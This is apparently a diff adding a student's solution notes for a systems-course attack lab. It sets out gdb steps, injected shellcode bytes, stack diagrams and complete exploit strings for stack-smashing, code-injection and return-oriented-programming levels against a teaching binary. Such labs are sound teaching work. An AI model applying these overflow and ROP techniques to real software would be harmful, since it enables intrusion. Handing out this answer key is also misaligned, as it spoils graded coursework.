@@ -1,0 +1,176 @@
+CODE INJECTION
+*********************************
+* level 1: stack smashing attacks
+*********************************
+unix> gdb ctarget
+(gdb) disas getbuf
+// sub $0x28, %rsp  -->  40bytes
+// to overwrite the address, exploit string should be 48bytes long
+(gdb) disas touch1
+// the address of touch1 is 0x4017c0, which is what we want
+// therefore, byte ordering of attack string(exploit1.txt): 
+                      xx xx xx xx xx xx xx xx
+                      xx xx xx xx xx xx xx xx
+                      xx xx xx xx xx xx xx xx
+                      xx xx xx xx xx xx xx xx
+                      xx xx xx xx xx xx xx xx
+                      c0 17 40 00 00 00 00 00
+// generate hex-formatted exploit string
+unix> ./hex2raw < exploit1.txt > exploit-raw1.txt
+unix> ./ctarget < exploit-raw1.txt -q
+// or run in gdb
+(gdb) run -i exploit-raw1.txt -q
+
+
+*********************************
+* level 2: code injection attacks
+********************************* 
+(gdb) disas touch2
+// address of touch2: 0x4017ec
+(gdb) disas getbuf
+// need to set the register %rdi in getbuf to my cookie 0x59b997fa
+// to get the instructions of setting %rdi to cookie, use information above to write an assembly code, the file name is: l2_instruction.s
+unix> gcc -c l2_instruction.s // get l2_instruction.o
+unix> objdump -d l2_instruction.o > l2_instruciton.d
+// inside l2_instruction.d, hex digits after the ':' is the byte codes for the instruction, the byte sequence for the code is:
+
+                   bf fa 97 b9 59 be ec 17 40 00 ff d6
+
+(gdb) stepi
+(gdb) x /12xg $rsp
+// 0x401976 is the initial return address, I want to overwrite it with the address that will make the program jump to exploit code above. Know that stack address storing the return address 0x401976 is 0x5561dca0 (value of %rsp), and exploit code is 12-byte long, thus, new return address should be %rsp sub 16, which is 0x5561dc90.
+// Therefore, byte ordering of attack string(exploit2.txt):
+                     	xx xx xx xx xx xx xx xx
+                        xx xx xx xx xx xx xx xx
+                        xx xx xx xx xx xx xx xx 
+			bf fa 97 b9 59 be ec 17
+			40 00 ff d6 00 00 00 00
+			90 dc 61 55 00 00 00 00
+
+
+*********************************
+* level 3: code injection attacks
+*********************************
+(gdb) disas touch3
+// <+0>: address of touch3: 0x4018fa
+// hand-generated ssembly code of instructions is similar to level2, but set %rdi to the address of the string consist of 8 hex digits representing my cookie 0x59b997fa
+// the string is "59b997fa" (*sval of touch3). its hex value (byte representation) is: 
+
+                       35 39 62 39 39 37 66 61 00
+                       (00 represents for the end of string)
+
+// caveat: letters in string should be lower case, because according to write-up, inside func hexmatch, the called func sprintf has the format "%.8x", which means val will converted to a string using lower case for hex, with at least 8 chars.
+// from level 2 problem, I've known ret address is 0x5561dca0. I set the address of instructions(l3_instruction.d) 0x5561dcb8, and the address of the string to 0x5561dcaf. The address of the string should before the ret address to avoid memory overwriting when calling func hexmatch and strncmp.
+// Thus, the stack likes this:
+                           ____________ stack address
+                           instructions    ...     // l3_instruction can also be set to other places
+                           instructions 0x5561dcb8
+                           string's     0x5561dcb0 // string must be above the ret on the stack
+                           byte repre   0x5561dca8
+                           0x5561dcb8   0x5561dca0
+                              ...       0x5561dc98
+                          _____________    ...
+
+// Therefore, byte ordering of the exploit string(exploit3.txt):
+                 	   xx xx xx xx xx xx xx xx
+                	   xx xx xx xx xx xx xx xx
+                 	   xx xx xx xx xx xx xx xx
+ 	    		   xx xx xx xx xx xx xx xx
+                	   xx xx xx xx xx xx xx xx
+                	   b8 dc 61 55 00 00 00 00
+                	   00 00 00 00 00 00 00 35
+                	   39 62 39 39 37 66 61 00
+                	   bf af dc 61 55 be fa 18
+                	   40 00 ff d6 00 00 00 00
+
+RETURN-ORIENTED PROGRAMMING
+**************************************
+* level 2*: ROP-touch touch2
+**************************************
+(gdb) disas touch2
+// address of touch2 is: 0x4017ec
+// use farm.asm to find useful gadgets: getval_280, addval_273
+// gadget 1: 0x4019cc:  58 90 c3       pop  %rax; retq        // 90 --> nop
+// gadget 2: 0x4019a2:  48 89 c7 c3    movq %rax,%rdi; retq
+//                                     callq 0x4017ec <touch2>
+
+                       __________     stack address
+      call touch2 -->  0x4017ec       random value
+		       gadget 2	          ...
+		       0x59b997fa   
+                       gadget 1  
+  		       __________
+
+// Therefore, byte ordering of the exploit string(exploit4.txt):
+                           xx xx xx xx xx xx xx xx
+                           xx xx xx xx xx xx xx xx
+                           xx xx xx xx xx xx xx xx
+                           xx xx xx xx xx xx xx xx
+                           xx xx xx xx xx xx xx xx
+                           cc 19 40 00 00 00 00 00
+                           fa 97 b9 59 00 00 00 00
+                           a2 19 40 00 00 00 00 00
+                           ec 17 40 00 00 00 00 00
+                           
+*****************************************
+* level 3*: ROP-touch touch3
+*****************************************
+(gdb) disas touch3
+// address of touch3: 0x4018fa
+// need to consider where to store the string representation of my cookie?
+// gadget a: pop    %rax; retq       // %rax stores the pointer of my cookie(string)
+// gadget b: movq   %rax,%rdi; retq  // arg of touch3
+
+                       _________   stack address 
+       call touch3 --> 0x4018fa    random value
+                       gadget b        ...
+                       pointer
+                       of cookie
+                       gadget a
+                       _________
+
+// According to level 3, the string is "59b997fa" (*sval of touch3). its hex value (byte representation) is: 
+
+                       35 39 62 39 39 37 66 61 00
+                       (00 represents for the end of string)
+
+// I can't directly put it onto stack, because the stack address is random. So how can i solve it next?
+// I can still put the string(hex format) onto the stack, set it's address (%rsp) to a register. Then, use add instructions to find the value of %rsp.
+// In farm, <add_xy> is helpful to set cookie's location. But should set proper value to %rdi, %rsi
+// stack<reversed>:
+            <addval_190> 48 89 e0 c3    movq  %rsp,%rax // G1
+            <addval_273> 48 89 c7 c3    movq  %rax,%rdi // G2
+            <getval_280> 58 90 c3       popq  %rax      // G3. popq the value that determines the location
+            --- the value to pop ---    // 9*8 = 72 bytes, value = 0x48 
+            <addval_487> 89 c2 84 c0 c3 movl  %eax,%edx // G4
+ 				        testb %al, %al
+                                        retq
+  	    <getval_311> 89 d1 08 db c3 movl  %edx,%ecx // G5
+  					orb   %bl,%bl
+  					retq
+	    <addval_187> 89 ce 38 c0 c3 movl  %ecx,%esi // G6	
+					cmpb  %al,%al
+				 	retq
+	    <add_xy> 48 8d 04 37 c3     leaq  (%rdi,%rsi,1),%rax 
+					retq	        // G7
+ 	    <addval_273> 48 89 c7 c3    movq  %rax,%rdi // G8	
+            callq 0x4018fa <touch3>
+		cookie string
+// Therefore, byte ordering of the exploit string(exploit5.txt):
+			xx xx xx xx xx xx xx xx
+	 		xx xx xx xx xx xx xx xx
+			xx xx xx xx xx xx xx xx
+			xx xx xx xx xx xx xx xx
+			xx xx xx xx xx xx xx xx
+			06 1a 40 00 00 00 00 00
+			a2 19 40 00 00 00 00 00
+			cc 19 40 00 00 00 00 00
+			48 00 00 00 00 00 00 00
+			42 1a 40 00 00 00 00 00
+			69 1a 40 00 00 00 00 00
+			27 1a 40 00 00 00 00 00
+			d6 19 40 00 00 00 00 00
+                        a2 19 40 00 00 00 00 00
+			fa 18 40 00 00 00 00 00
+			35 39 62 39 39 37 66 61
+			00 00 00 00 00 00 00 00
